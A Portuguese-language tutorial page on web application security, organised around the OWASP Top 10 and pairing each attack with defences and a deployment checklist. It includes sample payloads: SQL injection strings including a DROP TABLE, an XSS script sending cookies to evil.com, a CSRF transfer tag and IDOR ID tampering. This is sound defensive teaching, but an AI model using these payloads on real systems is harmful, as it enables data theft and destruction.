# 🛡️ Segurança de Aplicação

> Aplicações vulneráveis vazam dados de usuários, sofrem fraudes financeiras, viram base de ataques. Segurança não é tópico avançado — é **higiene básica de dev**. Você não precisa virar pentester, mas precisa conhecer os ataques mais comuns e como proteger.

---

## 🎯 OWASP Top 10

A **OWASP** (Open Web Application Security Project) publica a lista das vulnerabilidades web mais críticas. É a referência da indústria.

### Top 10 atual

1. 🔓 **Broken Access Control** — falhas de autorização
2. 🔐 **Cryptographic Failures** — dados sensíveis expostos
3. 💉 **Injection** — SQL injection, NoSQL injection, XSS
4. 🏗️ **Insecure Design** — falhas de design, não de código
5. ⚙️ **Security Misconfiguration** — configurações padrão inseguras
6. 📦 **Vulnerable Components** — bibliotecas com CVEs
7. 🔑 **Authentication Failures** — login fraco, sessões mal geridas
8. 🔄 **Software and Data Integrity Failures** — dependências comprometidas
9. 📜 **Security Logging Failures** — sem logs, sem detecção
10. 🌐 **Server-Side Request Forgery (SSRF)** — servidor faz request a recursos internos

Vamos aos principais com detalhes.

---

## 💉 1. SQL Injection

### O ataque

Atacante coloca SQL no input.

```java
// ❌ VULNERÁVEL - concatenação
String sql = "SELECT * FROM usuarios WHERE email = '" + email + "'";
```

Se atacante coloca `email = "' OR '1'='1"`:
```sql
SELECT * FROM usuarios WHERE email = '' OR '1'='1'
-- retorna TODOS os usuários
```

Pior ainda: `'; DROP TABLE usuarios; --` deleta a tabela.

### A proteção: Prepared Statements

```java
// ✅ SEGURO - prepared statement
String sql = "SELECT * FROM usuarios WHERE email = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, email);
```

O DB **separa código de dados** — input nunca é tratado como SQL.

> 💡 **ORMs modernos (JPA, Prisma, SQLAlchemy) usam prepared statements automaticamente.** Você só fica vulnerável se concatenar SQL na mão (`@Query` com string concat ou raw queries).

---

## 🌐 2. XSS (Cross-Site Scripting)

### O ataque

Atacante injeta **JavaScript** que executa no browser de outras vítimas.

**Cenário**: campo de comentário sem sanitização.

```html
<!-- Atacante posta como comentário: -->
<script>fetch('https://evil.com?cookies='+document.cookie)</script>

<!-- Quando outro usuário vê o comentário, o script roda no browser dele -->
```

### Tipos de XSS

| Tipo | Onde mora |
|---|---|
| **Stored** | Salvo no banco (mais perigoso) |
| **Reflected** | No URL (`?search=<script>...`) |
| **DOM-based** | Manipulação do DOM no cliente |

### Proteções

#### Escape no output

```html
<!-- ❌ Vulnerável -->
<div>{{ comentario }}</div>  (sem escape)

<!-- ✅ Frameworks modernos escapam por padrão -->
React: {comentario}              ← escapa automaticamente
Vue: {{ comentario }}            ← escapa automaticamente
Thymeleaf: th:text="${coment}"  ← escapa automaticamente
```

#### Content Security Policy (CSP)

Header HTTP que **limita** o que o browser pode executar:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.confiavel.com
```

Acima: scripts só do próprio domínio + CDN específica.

#### HttpOnly cookies

Cookies de sessão devem ser **HttpOnly** — JavaScript não consegue ler.

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

Se XSS rolar, atacante não consegue roubar a sessão.

---

## 🔒 3. CSRF (Cross-Site Request Forgery)

### O ataque

Vítima está logada no banco. Atacante manda link malicioso. Vítima clica → ação executada com credenciais dela.

```html
<!-- Site malicioso -->
<img src="https://meubanco.com/transferir?valor=1000&para=atacante">
```

Se a vítima estiver logada no banco e clicar nesse link, a request leva os cookies dela e a transferência rola.

### Proteção: CSRF Token

Cada formulário inclui um **token único e imprevisível**:

```html
<form>
  <input type="hidden" name="csrf_token" value="a8f3..." />
  <input name="valor" />
  <button>Transferir</button>
</form>
```

Servidor valida que o token é válido antes de processar.

> 💡 **APIs com JWT em Authorization header não sofrem CSRF** (atacante não tem como adicionar header em request cross-origin). CSRF é problema de **cookies**.

### SameSite Cookies

```http
Set-Cookie: session=abc; SameSite=Strict
```

Browser **não envia o cookie** em requests cross-origin. Mata CSRF de forma elegante.

---

## 🔓 4. Broken Access Control (IDOR)

### O ataque

URL: `/api/pedidos/12345`

Atacante muda o ID e acessa pedido de outro usuário:
```
GET /api/pedidos/12346  ← pedido do João, mas o atacante é Maria
GET /api/pedidos/99999  ← admin
```

### Proteção: sempre verificar autorização

```java
// ❌ VULNERÁVEL
@GetMapping("/pedidos/{id}")
public Pedido buscar(@PathVariable Long id) {
    return repo.findById(id).orElseThrow();
}

// ✅ SEGURO
@GetMapping("/pedidos/{id}")
public Pedido buscar(@PathVariable Long id, Authentication auth) {
    Pedido p = repo.findById(id).orElseThrow();
    if (!p.getUsuarioId().equals(getUserId(auth))) {
        throw new AccessDeniedException();
    }
    return p;
}
```

> 🤔 **Princípio**: nunca confie só na URL. **Sempre verifique** se o usuário autenticado pode acessar aquele recurso específico.

---

## 🔑 5. Autenticação Segura

### Senhas

Já vimos no [tópico de Criptografia](./10-criptografia.md):

- ✅ **bcrypt** ou **argon2** com salt
- ❌ Nunca MD5, SHA-1, SHA-256 puro
- ❌ Nunca armazenar plaintext

### Política de senhas

- ✅ Mínimo 8 caracteres (NIST recomenda 12)
- ✅ Verificar contra **HaveIBeenPwned** (lista de senhas vazadas)
- ❌ NÃO obrigar caracteres especiais aleatórios (gera "Senha@123" inseguras)

### MFA (Multi-Factor Authentication)

3 fatores:
1. 🧠 **Algo que você sabe** (senha)
2. 📱 **Algo que você tem** (celular, token)
3. 👆 **Algo que você é** (biometria)

**TOTP** (Google Authenticator, Authy) é o padrão moderno.

### JWT com responsabilidade

```
✅ Expiração curta (15 min - 1h)
✅ Refresh tokens com rotação
✅ Blacklist em logout (Redis)
✅ Algoritmo forte (RS256, não HS256 com chave fraca)
❌ NÃO bote dados sensíveis no payload
❌ NÃO confie em "alg: none" (vulnerabilidade clássica)
```

---

## 📦 6. Vulnerabilidades em Dependências

### O problema

Sua app usa 50 libs. Cada uma usa outras 50. **Total: milhares**. Qualquer uma com CVE compromete tudo.

### Caso famoso: Log4Shell (Dezembro 2021)

Vulnerabilidade no `log4j` (lib de logging do Java). Atacante mandava string especial num campo qualquer (User-Agent, nome) → executava código arbitrário no servidor. **Bilhões de aplicações afetadas globalmente**.

### Proteção

#### Scanners de dependências

```bash
# Java
mvn dependency-check:check

# Node
npm audit
npm audit fix

# Python
pip-audit

# Go
govulncheck ./...
```

#### Ferramentas no CI

- **Dependabot** (GitHub) — abre PR automático pra atualizar libs
- **Snyk** — scan e fix
- **GitHub Security Advisories**
- **OWASP Dependency-Check**

> 💡 **Configura o Dependabot**: ele monitora e abre PRs automáticos quando há vulnerabilidade. Em projetos sérios, isso é obrigatório.

---

## 🌐 7. Headers de Segurança HTTP

Configure no servidor/proxy. Lista mínima:

| Header | O que faz |
|---|---|
| `Strict-Transport-Security` | Força HTTPS sempre |
| `Content-Security-Policy` | Restringe recursos carregáveis |
| `X-Content-Type-Options: nosniff` | Impede MIME sniffing |
| `X-Frame-Options: DENY` | Previne clickjacking |
| `Referrer-Policy: strict-origin-when-cross-origin` | Controla header Referer |
| `Permissions-Policy` | Restringe APIs do browser (câmera, mic, etc) |

### Em Spring Security

```java
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filter(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
                .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000))
                .frameOptions(frame -> frame.deny())
            );
        return http.build();
    }
}
```

> 🔧 **Teste seus headers**: [securityheaders.com](https://securityheaders.com) dá nota A-F pra qualquer site.

---

## 🚨 8. Logging e Monitoramento de Segurança

Logs devem registrar (sem dados sensíveis!):

- 🔐 Tentativas de login (sucesso e falha)
- 🚫 Tentativas de acesso não autorizado
- 💉 Inputs suspeitos detectados
- 🔄 Mudanças de permissão
- 📤 Exportação massiva de dados

> ⚠️ **NUNCA logue**: senhas (mesmo erradas), tokens, cartões, CPFs em texto. Se vazar o log, vaza tudo.

### Alertas

Configure alertas pra:
- 5+ logins falhados em 1 minuto (brute force)
- Acesso a recursos de admin por usuário comum
- Picos de erros 401/403
- Requests de IPs em blocklists

---

## 🔐 9. Secrets Management

### ❌ Nunca

```bash
# .env commitado no Git
DB_PASSWORD=senha123

# Hardcoded no código
String apiKey = "sk-abc123def456";
```

Mesmo que delete depois, **fica no histórico** do Git pra sempre.

### ✅ Sempre

#### Variáveis de ambiente
```bash
export DB_PASSWORD=senha123
```

Nunca commitadas, configuradas no servidor/CI.

#### Secret Managers
- **AWS Secrets Manager**, **AWS Parameter Store**
- **HashiCorp Vault** (open source)
- **Google Secret Manager**
- **Azure Key Vault**
- **Doppler**, **1Password**

```java
// Spring + AWS Secrets Manager
@Value("${aws.secret.db-password}")
private String dbPassword;
```

#### Se vazou um secret no Git

1. **Rotaciona imediatamente** a credencial vazada
2. Remove do histórico (BFG Repo-Cleaner ou `git filter-branch`)
3. Force push (cuidado — quebra clones existentes)
4. Monitora uso suspeito da credencial antiga

---

## 🛡️ 10. Outras Boas Práticas Importantes

### Validação de input

**Sempre** valide entrada:

```java
@PostMapping("/usuarios")
public ResponseEntity<?> criar(@Valid @RequestBody UsuarioDto dto) {
    // @Valid + Bean Validation cuida disso
}

class UsuarioDto {
    @NotBlank
    @Size(max = 100)
    private String nome;

    @Email
    @NotBlank
    private String email;

    @Min(18)
    @Max(120)
    private Integer idade;
}
```

### Princípio do Menor Privilégio

Cada componente deve ter **apenas** as permissões mínimas:
- 🗄️ Banco: usuário do app **não é** root
- 🖥️ Container: roda como usuário não-root
- 🔑 Tokens de API: escopo restrito
- 📁 Arquivos: permissões mínimas (chmod 600 pra secrets)

### HTTPS Everywhere

Já em 2026, **não tem desculpa**. Let's Encrypt é gratuito e automatizável.

### Backup e Recovery

Não é só segurança contra ataque externo — também contra **erros internos** e **ransomware**.

- ✅ Backups automatizados
- ✅ Backups testados (restore funciona?)
- ✅ Backups offsite (outra região, outro provider)
- ✅ Encriptados

---

## 🎯 Checklist Mínimo de Segurança

Antes de qualquer deploy em produção, confira:

- [ ] HTTPS forçado (HSTS configurado)
- [ ] Senhas com bcrypt/argon2 + salt
- [ ] Prepared statements (sem SQL concat)
- [ ] Input validation em todos os endpoints
- [ ] Authorization em **cada** recurso (não confia só em login)
- [ ] CSP, X-Frame-Options, outros headers de segurança
- [ ] Rate limiting em endpoints sensíveis (login, signup, password reset)
- [ ] Secrets em variáveis de ambiente, **nunca** no Git
- [ ] Dependabot/Snyk monitorando dependências
- [ ] Logs sem dados sensíveis
- [ ] Backups automatizados e testados
- [ ] Plano de resposta a incidentes documentado

---

## ✅ Resumo da página

- **OWASP Top 10** é o checklist mínimo
- **SQL Injection**: use prepared statements (ORMs já fazem)
- **XSS**: frameworks modernos escapam — não desabilite. Use CSP
- **CSRF**: tokens + SameSite cookies
- **Broken Access Control**: sempre verifique autorização por recurso
- **Senhas**: bcrypt/argon2 + MFA quando possível
- **Dependências**: Dependabot/Snyk no CI
- **Headers**: HSTS, CSP, X-Frame-Options no mínimo
- **Secrets**: variáveis de ambiente ou secret manager — NUNCA no código
- **Logs**: sim, mas sem dados sensíveis
- **Princípio do menor privilégio** em tudo

---

⬅️ [Anterior: APIs Avançadas](./21-apis-avancadas.md) | 🔙 [Índice](./README.md) | ➡️ [Próximo: Performance e Profiling](./23-performance.md)
